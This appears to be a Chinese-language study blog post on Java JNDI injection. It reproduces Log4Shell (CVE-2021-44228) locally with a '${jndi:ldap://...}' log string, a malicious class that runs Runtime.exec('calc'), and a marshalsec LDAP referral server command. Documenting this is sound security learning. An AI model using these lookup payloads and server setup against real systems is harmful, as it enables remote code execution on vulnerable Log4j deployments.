## 前言

小弟最近在学习java代码审计，写这篇文章的目的呢是记录下自己的学习过程，如果文章中有哪些地方不对的话还请大佬们多多斧正。

## JNDI介绍

简单来说呢，JNDI相当与是Java里面的一个api，它可以通过命名来查找数据和对象。

下面是官方的解释：

JNDI是Java Naming and Directory
Interface（JAVA命名和目录接口）的英文简写，它是为JAVA应用程序提供命名和目录访问服务的[API](https://so.csdn.net/so/search?q=API&spm=1001.2101.3001.7020)（Application
Programing Interface，应用程序编程接口）。

## 深入理解

JNDI中有两个方法：

  * bind()
  * lookup()

其中：bind()方法的作用是将名称绑定到对象里面，lookup()方法的作用是通过名字检索执行的对象，其中当lookup()方法的参数可控时，攻击者就可以将恶意的url传入参数加载恶意的类。

下面是JNDI cilent端漏洞代码：

    
    
    Context ctx = new InitialContext();
    ctx.lookup(url);

其中url参数可控，攻击者就可以构造payload：rmi://127.0.0.1:xxxx/payload 来加载恶意的类。

payload中看到了rmi，翻阅资料后对与RMI的解释是：RMI是一个基于序列化的Java远程方法调用机制，使用 RMI技术可以使一个
JVM中的对象，调用另一个 JVM 中的对象方法并获取调用结果。

简单理解应该就是可以通过cilent端远程访问服务端的类吧。

  

这里要构造恶意的RMI服务端，不得不了解新的知识：

>  
>
> 在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object
> factory，最终通过factory类将reference转换为具体的对象实例。  
>  
>

## 经典漏洞复现

这里小弟选择的是 **Apache log4j(CVE-2021-44228)** 来进行漏洞复现

漏洞代码如下：

    
    
    import org.apache.logging.log4j.Logger;
    import org.apache.logging.log4j.LogManager;
    public class Poc {
        private static final Logger log = LogManager.getLogger();
        public static void main(String[] args) {
            log.error("${jndi:rmi://127.0.0.1:xxxx/xxxx}");
        }
    }  
      
    

编译一个恶意类j1ngyu.class

先在本地编写一个恶意java文件：

    
    
    class Exploit {
        static {
            System.err.println("err");
            try {
                String cmds = "calc";
                Runtime.getRuntime().exec(cmds);
            } catch ( Exception e ) {
                e.printStackTrace();
            }
        }
    }  
      
    

这个恶意文件就是用exec()打开计算机

下一步在本地开启一个ldap服务，

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
"http://127.0.0.1:7777/#Exploit" 8888

再运行上面的漏洞代码：

    
    
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;
    class LogTest {
      public static final Logger logger = LogManager.getLogger();
      public static void main(String[] args) {
        logger.error("${jndi:ldap://xxxx:8888/j1ngyu}");
      }

这样恶意类就执行成功了。

![1652529093_627f97c528bc1d84f68f3.png!small?1652529094593](https://image.3001.net/images/20220514/1652529093_627f97c528bc1d84f68f3.png!small?1652529094593)

## 结束语

这次JNDI注入学习还有很多地方没有理解到位，希望大佬们能够多多斧正。

